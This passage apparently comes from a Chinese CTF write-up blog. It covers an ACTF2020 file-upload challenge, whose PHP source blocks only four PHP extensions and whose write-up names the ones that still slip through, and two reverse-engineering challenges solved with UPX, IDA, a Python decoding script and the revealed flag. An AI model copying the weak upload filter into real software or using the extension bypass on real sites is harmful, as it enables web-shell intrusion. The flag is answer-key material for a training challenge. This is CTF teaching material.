class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">span</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;flare&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">\terror_reporting(0);</span><br><span class=\"line\">\t//设置上传目录</span><br><span class=\"line\">\tdefine(&quot;UPLOAD_PATH&quot;, &quot;./uplo4d&quot;);</span><br><span class=\"line\">\t$msg = &quot;Upload Success!&quot;;</span><br><span class=\"line\">\tif (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class=\"line\">        $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class=\"line\">        $file_name = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;];</span><br><span class=\"line\">        $ext = pathinfo($file_name,PATHINFO_EXTENSION);</span><br><span class=\"line\">        if(in_array($ext, [&#x27;php&#x27;, &#x27;php3&#x27;, &#x27;php4&#x27;, &#x27;php5&#x27;])) &#123;</span><br><span class=\"line\">\t        exit(&#x27;nonono~ Bad file！&#x27;);</span><br><span class=\"line\">    \t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        $new_file_name = md5($file_name).&quot;.&quot;.$ext;</span><br><span class=\"line\">        $img_path = UPLOAD_PATH . &#x27;/&#x27; . $new_file_name;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        if (move_uploaded_file($temp_file, $img_path))&#123;</span><br><span class=\"line\">            $is_upload = true;</span><br><span class=\"line\">        &#125; else &#123;</span><br><span class=\"line\">            $msg = &#x27;Upload Failed!&#x27;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        echo &#x27;<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;color:#F00&quot;</span>&gt;</span>&#x27;.$msg.&quot; Look here~ &quot;.$img_path.&quot;<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span>&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>看来后台过滤了’php’, ‘php3’, ‘php4’, ‘php5’这几个后缀，也就是还剩’php7’,’phtml’,’phps’,’pht’这几个格式还能用。</p>\n<hr>\n<p>参考：<a href=\"https://www.cnblogs.com/yesec/p/12403922.html\"># [BUUOJ记录] [ACTF2020 新生赛]Upload _</a></p>\n","categories":["Web","文件上传","PHP代码审计"]},{"title":"ACTF新生赛2020-easyre","url":"/2021/09/04/ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-easyre/","content":"<p><a href=\"https://buuoj.cn/challenges#[ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020]easyre\">题目链接</a><br>附件下载得到程序，看一下信息：<br><img src=\"/images/Writeup/20210904074020.png\"><br>upx脱壳一下：</p>\n<figure class=\"highlight cmd\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">D:\\<span class=\"title\">Downloads</span>\\<span class=\"title\">attachment</span>\\<span class=\"title\">tmp</span>&gt;<span class=\"title\">upx</span> -<span class=\"title\">d</span> <span class=\"title\">easyre.exe</span></span></span><br><span class=\"line\"><span class=\"function\">                       <span class=\"title\">Ultimate</span> <span class=\"title\">Packer</span> <span class=\"title\">for</span> <span class=\"title\">eXecutables</span></span></span><br><span class=\"line\"><span class=\"function\">                          <span class=\"title\">Copyright</span> (<span class=\"title\">C</span>) 1996 - 2020</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">UPX</span> 3.96<span class=\"title\">w</span>       <span class=\"title\">Markus</span> <span class=\"title\">Oberhumer</span>, <span class=\"title\">Laszlo</span> <span class=\"title\">Molnar</span> &amp; <span class=\"title\">John</span> <span class=\"title\">Reiser</span>   <span class=\"title\">Jan</span> 23<span class=\"title\">rd</span> 2020</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">        <span class=\"title\">File</span> <span class=\"title\">size</span>         <span class=\"title\">Ratio</span>      <span class=\"title\">Format</span>      <span class=\"title\">Name</span></span></span><br><span class=\"line\"><span class=\"function\">   --------------------   ------   -----------   -----------</span></span><br><span class=\"line\"><span class=\"function\">     28123 &lt;-     21467   76.33%    <span class=\"title\">win32</span>/<span class=\"title\">pe</span>     <span class=\"title\">easyre.exe</span></span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">Unpacked</span> 1 <span class=\"title\">file</span>.</span></span><br></pre></td></tr></table></figure>\n<p>拖进IDA看一下主函数：<br><img src=\"/images/Writeup/20210904074243.png\"></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> __cdecl <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **argv, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **envp)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  _BYTE v4[<span class=\"number\">12</span>]; <span class=\"comment\">// [esp+12h] [ebp-2Eh] BYREF</span></span><br><span class=\"line\">  _DWORD v5[<span class=\"number\">3</span>]; <span class=\"comment\">// [esp+1Eh] [ebp-22h]</span></span><br><span class=\"line\">  _BYTE v6[<span class=\"number\">5</span>]; <span class=\"comment\">// [esp+2Ah] [ebp-16h] BYREF</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> v7; <span class=\"comment\">// [esp+2Fh] [ebp-11h]</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> v8; <span class=\"comment\">// [esp+33h] [ebp-Dh]</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> v9; <span class=\"comment\">// [esp+37h] [ebp-9h]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> v10; <span class=\"comment\">// [esp+3Bh] [ebp-5h]</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> i; <span class=\"comment\">// [esp+3Ch] [ebp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  __main();</span><br><span class=\"line\">  qmemcpy(v4, <span class=\"string\">&quot;*F&#x27;\\&quot;N,\\&quot;(I?+@&quot;</span>, <span class=\"keyword\">sizeof</span>(v4));</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Please input:&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%s&quot;</span>, v6);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v6[<span class=\"number\">0</span>] != <span class=\"string\">&#x27;A&#x27;</span> || v6[<span class=\"number\">1</span>] != <span class=\"number\">67</span> || v6[<span class=\"number\">2</span>] != <span class=\"number\">84</span> || v6[<span class=\"number\">3</span>] != <span class=\"number\">70</span> || v6[<span class=\"number\">4</span>] != <span class=\"number\">123</span> || v10 != <span class=\"number\">125</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">  v5[<span class=\"number\">0</span>] = v7;</span><br><span class=\"line\">  v5[<span class=\"number\">1</span>] = v8;</span><br><span class=\"line\">  v5[<span class=\"number\">2</span>] = v9;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">11</span>; ++i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v4[i] != _data_start__[*((<span class=\"keyword\">char</span> *)v5 + i) - <span class=\"number\">1</span>] )</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;You are correct!&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>看一下关键部分：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Please input:&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%s&quot;</span>, v6);</span><br><span class=\"line\"><span class=\"keyword\">if</span> ( v6[<span class=\"number\">0</span>] != <span class=\"string\">&#x27;A&#x27;</span> || v6[<span class=\"number\">1</span>] != <span class=\"number\">67</span> || v6[<span class=\"number\">2</span>] != <span class=\"number\">84</span> || v6[<span class=\"number\">3</span>] != <span class=\"number\">70</span> || v6[<span class=\"number\">4</span>] != <span class=\"number\">123</span> || v10 != <span class=\"number\">125</span> )</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">v5[<span class=\"number\">0</span>] = v7;</span><br><span class=\"line\">v5[<span class=\"number\">1</span>] = v8;</span><br><span class=\"line\">v5[<span class=\"number\">2</span>] = v9;</span><br><span class=\"line\"><span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">11</span>; ++i )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> ( v4[i] != _data_start__[*((<span class=\"keyword\">char</span> *)v5 + i) - <span class=\"number\">1</span>] )</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;You are correct!&quot;</span>);</span><br></pre></td></tr></table></figure>\n<p>定位一下_data_start__的数据：<br><img src=\"/images/Writeup/20210904095450.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">.data:00402000 ; char _data_start__[]</span><br><span class=\"line\">.data:00402000 __data_start__  db 7Eh                  ; DATA XREF: _main+EC↑r</span><br><span class=\"line\">.data:00402001 aZyxwvutsrqponm db &#x27;&#125;|&#123;zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&#x27;</span><br><span class=\"line\">.data:00402001                 db &#x27;&lt;;:9876543210/.-,+*)(&#x27;,27h,&#x27;&amp;%$# !&quot;&#x27;,0</span><br></pre></td></tr></table></figure>\n<p>看一下代码，写个脚本：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">key = <span class=\"string\">&#x27;~&#125;|&#123;zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:9876543210/.-,+*)(\\&#x27;&amp;%$# !&quot;&#x27;</span> <span class=\"comment\">#&#x27;一定要加\\</span></span><br><span class=\"line\">encrypt = [<span class=\"number\">42</span>,<span class=\"number\">70</span>,<span class=\"number\">39</span>,<span class=\"number\">34</span>,<span class=\"number\">78</span>,<span class=\"number\">44</span>,<span class=\"number\">34</span>,<span class=\"number\">40</span>,<span class=\"number\">73</span>,<span class=\"number\">63</span>,<span class=\"number\">43</span>,<span class=\"number\">64</span>]</span><br><span class=\"line\">x = []</span><br><span class=\"line\">flag = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> encrypt:</span><br><span class=\"line\">  x.append(key.find(<span class=\"built_in\">chr</span>(i))+<span class=\"number\">1</span>) </span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> x:</span><br><span class=\"line\">  flag += <span class=\"built_in\">chr</span>(i)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(flag)</span><br></pre></td></tr></table></figure>\n<p>得到输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">U9X_1S_W6@T?</span><br></pre></td></tr></table></figure>\n<p>flag:<del>flag{U9X_1S_W6@T?}</del></p>\n<hr>\n<p>参考：<br>1.<a href=\"https://blog.csdn.net/weixin_46009088/article/details/109521777\">BUUCTF_[ACTF新生赛2020]easyre</a></p>\n","categories":["Reserve","UPX"]},{"title":"ACTF新生赛2020-rome","url":"/2021/08/29/ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-rome/","content":"<p><a href=\"https://buuoj.cn/challenges#[ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020]rome\">题目链接</a><br>附件下载得到程序，看一下信息：<br><img src=\"/images/Writeup/20210829202214.png\"><br>用IDA打开看一下：<br><img src=\"/images/Writeup/20210829202301.png\"><br>F5逆向一下看一下，核心函数应该是func（），ASCII对变量转码看一下：<br><img src=\"/images/Writeup/20210829202414.png\"></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">func</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> result; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> v1[<span class=\"number\">4</span>]; <span class=\"comment\">// [esp+14h] [ebp-44h]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> __int8 v2; <span class=\"comment\">// [esp+24h] [ebp-34h] BYREF</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> __int8 v3; <span class=\"comment\">// [esp+25h] [ebp-33h]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> __int8 v4; <span class=\"comment\">// [esp+26h] [ebp-32h]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> __int8 v5; <span class=\"comment\">// [esp+27h] [ebp-31h]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> __int8 v6; <span class=\"comment\">// [esp+28h] [ebp-30h]</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> v7; <span class=\"comment\">// [esp+29h] [ebp-2Fh]</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> v8; <span class=\"comment\">// [esp+2Dh] [ebp-2Bh]</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> v9; <span class=\"comment\">// [esp+31h] [ebp-27h]</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> v10; <span class=\"comment\">// [esp+35h] [ebp-23h]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> __int8 v11; <span class=\"comment\">// [esp+39h] [ebp-1Fh]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> v12[<span class=\"number\">29</span>]; <span class=\"comment\">// [esp+3Bh] [ebp-1Dh] BYREF</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">strcpy</span>(v12, <span class=\"string\">&quot;Qsw3sj_lz4_Ujw@l&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Please input:&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%s&quot;</span>, &amp;v2);</span><br><span class=\"line\">  result = v2;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v2 == <span class=\"string\">&#x27;A&#x27;</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    result = v3;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v3 == <span class=\"string\">&#x27;C&#x27;</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      result = v4;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( v4 == <span class=\"string\">&#x27;T&#x27;</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        result = v5;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( v5 == <span class=\"string\">&#x27;F&#x27;</span> )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          result = v6;</span><br><span class=\"line\">          <span class=\"keyword\">if</span> ( v6 == <span class=\"string\">&#x27;&#123;&#x27;</span> )</span><br><span class=\"line\">          &#123;</span><br><span class=\"line\">            result = v11;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ( v11 == <span class=\"string\">&#x27;&#125;&#x27;</span> )</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              v1[<span class=\"number\">0</span>] = v7;</span><br><span class=\"line\">              v1[<span class=\"number\">1</span>] = v8;</span><br><span class=\"line\">              v1[<span class=\"number\">2</span>] = v9;</span><br><span class=\"line\">              v1[<span class=\"number\">3</span>] = v10;</span><br><span class=\"line\">              *(_DWORD *)&amp;v12[<span class=\"number\">17</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">              <span class=\"keyword\">while</span> ( *(<span class=\"keyword\">int</span> *)&amp;v12[<span class=\"number\">17</span>] &lt;= <span class=\"number\">15</span> )</span><br><span class=\"line\">              &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> ( *((<span class=\"keyword\">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class=\"number\">17</span>]) &gt; <span class=\"number\">64</span> &amp;&amp; *((<span class=\"keyword\">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class=\"number\">17</span>]) &lt;= <span class=\"number\">90</span> )</span><br><span class=\"line\">                  *((_BYTE *)v1 + *(_DWORD *)&amp;v12[<span class=\"number\">17</span>]) = (*((<span class=\"keyword\">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class=\"number\">17</span>]) - <span class=\"number\">51</span>) % <span class=\"number\">26</span> + <span class=\"number\">65</span>;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> ( *((<span class=\"keyword\">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class=\"number\">17</span>]) &gt; <span class=\"number\">96</span> &amp;&amp; *((<span class=\"keyword\">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class=\"number\">17</span>]) &lt;= <span class=\"number\">122</span> )</span><br><span class=\"line\">                  *((_BYTE *)v1 + *(_DWORD *)&amp;v12[<span class=\"number\">17</span>]) = (*((<span class=\"keyword\">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class=\"number\">17</span>]) - <span class=\"number\">79</span>) % <span class=\"number\">26</span> + <span class=\"number\">97</span>;</span><br><span class=\"line\">                ++*(_DWORD *)&amp;v12[<span class=\"number\">17</span>];</span><br><span class=\"line\">              &#125;</span><br><span class=\"line\">              *(_DWORD *)&amp;v12[<span class=\"number\">17</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">              <span class=\"keyword\">while</span> ( *(<span class=\"keyword\">int</span> *)&amp;v12[<span class=\"number\">17</span>] &lt;= <span class=\"number\">15</span> )</span><br><span class=\"line\">              &#123;</span><br><span class=\"line\">                result = (<span class=\"keyword\">unsigned</span> __int8)v12[*(_DWORD *)&amp;v12[<span class=\"number\">17</span>);</span><br><span class=\"line\">                <span class=\"keyword\">if</span> ( *((_BYTE *)v1 + *(_DWORD *)&amp;v12[<span class=\"number\">17</span>]) != (_BYTE)result )</span><br><span class=\"line\">                  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">                ++*(_DWORD *)&amp;v12[<span class=\"number\">17</span>];</span><br><span class=\"line\">              &#125;</span><br><span class=\"line\">              result = <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;You are correct!&quot;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>是我IDA出问题了吗，感觉跟网上的逆向结果不一样。？<br>网上的逆向代码：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">func</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> result; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> v1; <span class=\"comment\">// [esp+14h] [ebp-44h]</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> v2; <span class=\"comment\">// [esp+18h] [ebp-40h]</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> v3; <span class=\"comment\">// [esp+1Ch] [ebp-3Ch]</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> v4; <span class=\"comment\">// [esp+20h] [ebp-38h]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> __int8 v5; <span class=\"comment\">// [esp+24h] [ebp-34h]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> __int8 v6; <span class=\"comment\">// [esp+25h] [ebp-33h]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> __int8 v7; <span class=\"comment\">// [esp+26h] [ebp-32h]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> __int8 v8; <span class=\"comment\">// [esp+27h] [ebp-31h]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> __int8 v9; <span class=\"comment\">// [esp+28h] [ebp-30h]</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> v10; <span class=\"comment\">// [esp+29h] [ebp-2Fh]</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> v11; <span class=\"comment\">// [esp+2Dh] [ebp-2Bh]</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> v12; <span class=\"comment\">// [esp+31h] [ebp-27h]</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> v13; <span class=\"comment\">// [esp+35h] [ebp-23h]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> __int8 v14; <span class=\"comment\">// [esp+39h] [ebp-1Fh]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> v15; <span class=\"comment\">// [esp+3Bh] [ebp-1Dh]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> v16; <span class=\"comment\">// [esp+3Ch] [ebp-1Ch]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> v17; <span class=\"comment\">// [esp+3Dh] [ebp-1Bh]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> v18; <span class=\"comment\">// [esp+3Eh] [ebp-1Ah]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> v19; <span class=\"comment\">// [esp+3Fh] [ebp-19h]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> v20; <span class=\"comment\">// [esp+40h] [ebp-18h]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> v21; <span class=\"comment\">// [esp+41h] [ebp-17h]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> v22; <span class=\"comment\">// [esp+42h] [ebp-16h]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> v23; <span class=\"comment\">// [esp+43h] [ebp-15h]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> v24; <span class=\"comment\">// [esp+44h] [ebp-14h]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> v25; <span class=\"comment\">// [esp+45h] [ebp-13h]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> v26; <span class=\"comment\">// [esp+46h] [ebp-12h]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> v27; <span class=\"comment\">// [esp+47h] [ebp-11h]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> v28; <span class=\"comment\">// [esp+48h] [ebp-10h]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> v29; <span class=\"comment\">// [esp+49h] [ebp-Fh]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> v30; <span class=\"comment\">// [esp+4Ah] [ebp-Eh]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> v31; <span class=\"comment\">// [esp+4Bh] [ebp-Dh]</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> i; <span class=\"comment\">// [esp+4Ch] [ebp-Ch]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v15 = <span class=\"number\">81</span>;</span><br><span class=\"line\">  v16 = <span class=\"number\">115</span>;</span><br><span class=\"line\">  v17 = <span class=\"number\">119</span>;</span><br><span class=\"line\">  v18 = <span class=\"number\">51</span>;</span><br><span class=\"line\">  v19 = <span class=\"number\">115</span>;</span><br><span class=\"line\">  v20 = <span class=\"number\">106</span>;</span><br><span class=\"line\">  v21 = <span class=\"number\">95</span>;</span><br><span class=\"line\">  v22 = <span class=\"number\">108</span>;</span><br><span class=\"line\">  v23 = <span class=\"number\">122</span>;</span><br><span class=\"line\">  v24 = <span class=\"number\">52</span>;</span><br><span class=\"line\">  v25 = <span class=\"number\">95</span>;</span><br><span class=\"line\">  v26 = <span class=\"number\">85</span>;</span><br><span class=\"line\">  v27 = <span class=\"number\">106</span>;</span><br><span class=\"line\">  v28 = <span class=\"number\">119</span>;</span><br><span class=\"line\">  v29 = <span class=\"number\">64</span>;</span><br><span class=\"line\">  v30 = <span class=\"number\">108</span>;</span><br><span class=\"line\">  v31 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Please input:&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%s&quot;</span>, &amp;v5);</span><br><span class=\"line\">  result = v5;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v5 == <span class=\"string\">&#x27;A&#x27;</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    result = v6;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v6 == <span class=\"string\">&#x27;C&#x27;</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      result = v7;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( v7 == <span class=\"string\">&#x27;T&#x27;</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        result = v8;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( v8 == <span class=\"string\">&#x27;F&#x27;</span> )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          result = v9;</span><br><span class=\"line\">          <span class=\"keyword\">if</span> ( v9 == <span class=\"string\">&#x27;&#123;&#x27;</span> )</span><br><span class=\"line\">          &#123;</span><br><span class=\"line\">            result = v14;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ( v14 == <span class=\"string\">&#x27;&#125;&#x27;</span> )</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              v1 = v10;</span><br><span class=\"line\">              v2 = v11;</span><br><span class=\"line\">              v3 = v12;</span><br><span class=\"line\">              v4 = v13;</span><br><span class=\"line\">              <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">15</span>; ++i )</span><br><span class=\"line\">              &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> ( *((_BYTE *)&amp;v1 + i) &gt; <span class=\"number\">64</span> &amp;&amp; *((_BYTE *)&amp;v1 + i) &lt;= <span class=\"number\">90</span> )</span><br><span class=\"line\">                  *((_BYTE *)&amp;v1 + i) = (*((<span class=\"keyword\">char</span> *)&amp;v1 + i) - <span class=\"number\">51</span>) % <span class=\"number\">26</span> + <span class=\"number\">65</span>;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> ( *((_BYTE *)&amp;v1 + i) &gt; <span class=\"number\">96</span> &amp;&amp; *((_BYTE *)&amp;v1 + i) &lt;= <span class=\"number\">122</span> )</span><br><span class=\"line\">                  *((_BYTE *)&amp;v1 + i) = (*((<span class=\"keyword\">char</span> *)&amp;v1 + i) - <span class=\"number\">79</span>) % <span class=\"number\">26</span> + <span class=\"number\">97</span>;</span><br><span class=\"line\">              &#125;</span><br><span class=\"line\">              <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">15</span>; ++i )</span><br><span class=\"line\">              &#123;</span><br><span class=\"line\">                result = (<span class=\"keyword\">unsigned</span> __int8)*(&amp;v15 + i);</span><br><span class=\"line\">                <span class=\"keyword\">if</span> ( *((_BYTE *)&amp;v1 + i) != (_BYTE)result )</span><br><span class=\"line\">                  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">              &#125;</span><br><span class=\"line\">              result = <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;You are correct!&quot;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>总之，下面这段函数负责处理flag数据：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">15</span>; ++i )</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span 